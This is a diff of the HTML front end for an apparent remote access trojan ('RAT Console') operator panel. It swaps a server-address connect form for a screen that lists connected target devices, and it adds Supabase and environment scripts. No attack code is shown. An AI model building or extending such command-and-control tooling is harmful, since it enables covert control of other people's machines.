@@ -5,24 +5,22 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 		<link rel="stylesheet" href="app.css" />
 		<title>RAT Console</title>
+		<script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 	</head>
 	<body>
-		<!-- CONNECT SCREEN -->
-		<div id="connect-screen">
+		<!-- DEVICE SELECT SCREEN -->
+		<div id="device-screen">
 			<div class="card">
 				<h1>☠ remote console</h1>
-				<div class="subtitle">connect to target</div>
+				<div class="subtitle">select target device</div>
+				<div class="device-count" id="device-count">scanning for devices...</div>
 
-				<label>server address</label>
-				<input
-					type="text"
-					id="server-address"
-					value="http://localhost:6969"
-					placeholder="http://localhost:6969"
-				/>
+				<div class="device-list" id="device-list">
+					<div class="no-devices">waiting for connected devices...</div>
+				</div>
 
-				<button class="connect-btn" onclick="connect()">connect</button>
-				<div id="connect-error" class="error"></div>
+				<button class="connect-btn" id="connect-btn">connect to selected</button>
+				<div id="device-error" class="error"></div>
 			</div>
 		</div>
 
@@ -224,6 +222,7 @@
 			</div>
 		</div>
 
-		<script src="script.js"></script>
+		<script src="env.js" ></script>
+		<script src="script.js" type="module"></script>
 	</body>
 </html>
